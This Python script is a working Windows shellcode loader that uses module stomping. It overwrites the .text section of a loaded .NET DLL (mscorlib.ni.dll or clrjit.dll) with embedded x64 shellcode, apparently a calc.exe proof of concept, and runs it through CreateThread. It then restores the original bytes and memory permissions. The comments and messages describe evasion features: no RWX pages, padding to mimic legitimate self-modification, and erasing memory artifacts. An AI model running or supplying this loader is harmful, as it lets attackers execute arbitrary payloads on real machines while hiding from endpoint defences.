import ctypes
import sys
import os
import glob
import pefile
from ctypes import wintypes

# ── constants ─────────────────────────────────────────────────────────────────
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
MEM_RELEASE             = 0x8000
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40

# ── payload: calc.exe ─────────────────────────────────────────────────────────
payload = bytes([
    0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x31, 0xc9, 0x65, 0x48, 0x8b, 0x41, 0x60,
    0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x70, 0x10, 0x48, 0x8b, 0x36, 0x48, 0x8b, 0x36, 0x48, 0x8b,
    0x5e, 0x30, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81,
    0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x44, 0x8b, 0x52,
    0x14, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4c, 0x89, 0xd1, 0x48, 0xb8,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x90, 0x90, 0x48, 0xc1, 0xe0, 0x10, 0x48, 0xc1, 0xe8, 0x10,
    0x50, 0x48, 0xb8, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x50, 0x48, 0x89, 0xe0, 0x67,
    0xe3, 0x20, 0x31, 0xdb, 0x41, 0x8b, 0x1c, 0x8b, 0x4c, 0x01, 0xc3, 0x48, 0xff, 0xc9, 0x4c, 0x8b,
    0x08, 0x4c, 0x39, 0x0b, 0x75, 0xe9, 0x44, 0x8b, 0x48, 0x08, 0x44, 0x39, 0x4b, 0x08, 0x74, 0x03,
    0x75, 0xdd, 0xcc, 0x51, 0x41, 0x5f, 0x49, 0xff, 0xc7, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x1c,
    0x4d, 0x01, 0xc3, 0x43, 0x8b, 0x04, 0xbb, 0x4c, 0x01, 0xc0, 0x50, 0x41, 0x5f, 0x4d, 0x89, 0xfc,
    0x4c, 0x89, 0xc7, 0x4c, 0x89, 0xc1, 0x4d, 0x89, 0xe6, 0x48, 0x89, 0xf9, 0xb8, 0x61, 0x64, 0x90,
    0x90, 0xc1, 0xe0, 0x10, 0xc1, 0xe8, 0x10, 0x50, 0x48, 0xb8, 0x45, 0x78, 0x69, 0x74, 0x54, 0x68,
    0x72, 0x65, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x83, 0xec, 0x30, 0x41, 0xff, 0xd6, 0x48, 0x83, 0xc4,
    0x30, 0x49, 0x89, 0xc5, 0x4d, 0x89, 0xe6, 0x48, 0x89, 0xf9, 0x48, 0xb8, 0x57, 0x69, 0x6e, 0x45,
    0x78, 0x65, 0x63, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x83, 0xec, 0x30, 0x41, 0xff, 0xd6, 0x48,
    0x83, 0xc4, 0x30, 0x49, 0x89, 0xc6, 0x48, 0x83, 0xc4, 0x08, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50,
    0x48, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x50, 0x48, 0x89, 0xe1, 0xba, 0x01,
    0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x30, 0x41, 0xff, 0xd6, 0x31, 0xc9, 0x41, 0xff, 0xd5
])

kernel32 = ctypes.windll.kernel32

# ── wire up APIs ──────────────────────────────────────────────────────────────
kernel32.LoadLibraryW.restype        = wintypes.HMODULE
kernel32.LoadLibraryW.argtypes       = [wintypes.LPCWSTR]

kernel32.GetModuleHandleW.restype    = wintypes.HMODULE
kernel32.GetModuleHandleW.argtypes   = [wintypes.LPCWSTR]

kernel32.VirtualProtect.restype      = wintypes.BOOL
kernel32.VirtualProtect.argtypes     = [
    ctypes.c_void_p, ctypes.c_size_t,
    wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)
]

kernel32.CloseHandle.restype         = wintypes.BOOL
kernel32.CloseHandle.argtypes        = [wintypes.HANDLE]

# ── helper: locate mscorlib.ni.dll in the NativeImages cache ─────────────────
def find_ni_dll(dll_name):
    ni_roots = [
        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_64",
        "C:\\Windows\\assembly\\NativeImages_v4.0.30319_32",
        "C:\\Windows\\assembly\\NativeImages_v2.0.50727_64",
    ]
    for root in ni_roots:
        if not os.path.exists(root):
            continue
        matches = glob.glob(os.path.join(root, "**", dll_name), recursive=True)
        if matches:
            # normalize slashes — pefile needs proper backslashes on Windows
            normalized = os.path.normpath(matches[0])
            print(f"[+] Found {dll_name} at: {normalized}")
            return normalized
    return None

# ── step 1: load host DLL — keep dll_name and dll_path separate ──────────────
# dll_name  = short name used for GetModuleHandleW
# dll_path  = full on-disk path used for LoadLibraryW and pefile
dll_name    = "mscorlib.ni.dll"
dll_path    = find_ni_dll(dll_name)

if not dll_path:
    print(f"[-] mscorlib.ni.dll not found in NativeImages cache, falling back to clrjit.dll")
    dll_name = "clrjit.dll"
    dll_path = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clrjit.dll"

print(f"[+] Host DLL : {dll_name}")
print(f"[+] On-disk  : {dll_path}")

# LoadLibrary needs the full path for NI images
hMod = kernel32.LoadLibraryW(dll_path)
if not hMod:
    print("[-] LoadLibraryW failed"); sys.exit(1)

# GetModuleHandleW also needs the full path for NI images
live_base = kernel32.GetModuleHandleW(dll_path)
if not live_base:
    print("[-] GetModuleHandleW failed"); sys.exit(1)
print(f"[+] Live base: 0x{live_base:016x}")

# ── step 2: parse on-disk PE ──────────────────────────────────────────────────
if not os.path.exists(dll_path):
    print(f"[-] PE not found on disk at {dll_path}"); sys.exit(1)

pe = pefile.PE(dll_path, fast_load=False)
pe.parse_data_directories()

# ── step 3: find .text and record original characteristics ────────────────────
target_section = None
section_va     = None
section_vsize  = None
original_chars = None

for section in pe.sections:
    name  = section.Name.rstrip(b'\x00').decode(errors='replace')
    vsize = section.Misc_VirtualSize
    chars = section.Characteristics
    print(f"[*] Section {name:<12} VSize: 0x{vsize:08x}  RVA: 0x{section.VirtualAddress:08x}  Chars: 0x{chars:08x}")
    if b'.text' in section.Name and vsize >= len(payload):
        target_section = section
        section_va     = live_base + section.VirtualAddress
        section_vsize  = vsize
        original_chars = chars
        print(f"[+] Target: {name} @ live VA 0x{section_va:016x}")
        break

if not target_section:
    print("[-] No suitable .text section found"); sys.exit(1)

# derive original permissions from section characteristics
SECTION_EXEC  = 0x20000000
SECTION_READ  = 0x40000000
SECTION_WRITE = 0x80000000

if original_chars & SECTION_EXEC and original_chars & SECTION_WRITE:
    original_perms = PAGE_EXECUTE_READWRITE
elif original_chars & SECTION_EXEC:
    original_perms = PAGE_EXECUTE_READ
elif original_chars & SECTION_WRITE:
    original_perms = PAGE_READWRITE
else:
    original_perms = PAGE_READONLY

print(f"[+] Original section perms derived: 0x{original_perms:02x}")

# ── step 4: snapshot original bytes ──────────────────────────────────────────
orig_buf = (ctypes.c_byte * len(payload))()
ctypes.memmove(orig_buf, ctypes.c_void_p(section_va), len(payload))
original_bytes = bytes(orig_buf)
print(f"[+] Snapshotted {len(original_bytes)} original .text bytes")
print(f"[+] Original DLL bytes (first 100): {original_bytes[:100].hex(' ').upper()}")

# ── step 5: padding to mimic mscorlib.ni.dll self-mod footprint ───────────────
KNOWN_SELFMOD_SIZE = 0xB400
padded_size = max(len(payload), KNOWN_SELFMOD_SIZE)
print(f"[+] Padded write region: 0x{padded_size:x} bytes")

orig_padded_buf = (ctypes.c_byte * padded_size)()
ctypes.memmove(orig_padded_buf, ctypes.c_void_p(section_va), padded_size)
original_padded = bytes(orig_padded_buf)

# ── step 6: RX -> RW ─────────────────────────────────────────────────────────
old_protect = wintypes.DWORD(0)
result = kernel32.VirtualProtect(
    ctypes.c_void_p(section_va), padded_size,
    PAGE_READWRITE, ctypes.byref(old_protect)
)
if not result:
    print("[-] VirtualProtect RW failed"); sys.exit(1)
print(f"[+] Permissions: RX -> RW")

# ── step 7: write payload ─────────────────────────────────────────────────────
ctypes.memmove(section_va, payload, len(payload))
print(f"[+] Payload written @ 0x{section_va:016x} ({len(payload)} bytes)")

# ── step 8: RW -> RX ─────────────────────────────────────────────────────────
old_protect2 = wintypes.DWORD(0)
result = kernel32.VirtualProtect(
    ctypes.c_void_p(section_va), padded_size,
    PAGE_EXECUTE_READ, ctypes.byref(old_protect2)
)
if not result:
    print("[-] VirtualProtect RX failed"); sys.exit(1)
print(f"[+] Permissions: RW -> RX (no RWX ever)")

# ── step 9: execute via CreateThread ─────────────────────────────────────────
kernel32.CreateThread.restype  = wintypes.HANDLE
kernel32.CreateThread.argtypes = [
    ctypes.c_void_p,    # lpThreadAttributes
    ctypes.c_size_t,    # dwStackSize
    ctypes.c_void_p,    # lpStartAddress
    ctypes.c_void_p,    # lpParameter
    wintypes.DWORD,     # dwCreationFlags
    ctypes.POINTER(wintypes.DWORD)  # lpThreadId
]

kernel32.WaitForSingleObject.restype  = wintypes.DWORD
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

INFINITE = 0xFFFFFFFF

thread_id = wintypes.DWORD(0)
print(f"[+] Spawning thread @ 0x{section_va:016x}")

h_thread = kernel32.CreateThread(
    None,                       # default security attributes
    0,                          # default stack size
    section_va,                 # start address = payload
    None,                       # no parameter
    0,                          # run immediately
    ctypes.byref(thread_id)
)

if not h_thread:
    print("[-] CreateThread failed"); sys.exit(1)

print(f"[+] Thread spawned — TID: {thread_id.value}")
kernel32.WaitForSingleObject(h_thread, INFINITE)
print(f"[+] Thread completed")
kernel32.CloseHandle(h_thread)

# ── step 10: restore original bytes ──────────────────────────────────────────
print(f"[+] Restoring original bytes...")
old_protect3 = wintypes.DWORD(0)
kernel32.VirtualProtect(
    ctypes.c_void_p(section_va), padded_size,
    PAGE_READWRITE, ctypes.byref(old_protect3)
)
ctypes.memmove(section_va, original_padded, padded_size)
# read back and verify
verify_buf = (ctypes.c_byte * len(payload))()
ctypes.memmove(verify_buf, ctypes.c_void_p(section_va), len(payload))
restored_bytes = bytes(verify_buf)
print(f"[+] Restored DLL bytes  (first 100): {restored_bytes[:100].hex(' ').upper()}")

if restored_bytes == original_bytes:
    print(f"[+] Verify OK — restored bytes match original exactly")
else:
    print(f"[-] Verify FAILED — mismatch detected")
    # show first differing offset for easy debugging
    for i, (a, b) in enumerate(zip(original_bytes, restored_bytes)):
        if a != b:
            print(f"    First diff @ offset {i}: orig={a:02X} restored={b:02X}")
            break

print(f"[+] Original DLL bytes restored ({padded_size} bytes)")

# ── step 11: restore original section permissions ─────────────────────────────
old_protect4 = wintypes.DWORD(0)
kernel32.VirtualProtect(
    ctypes.c_void_p(section_va), padded_size,
    original_perms, ctypes.byref(old_protect4)
)
print(f"[+] Permissions restored to original: 0x{original_perms:02x}")
print(f"[+] Memory artifact eliminated — .text matches disk exactly")
print(f"[*] Done.")

pe.close()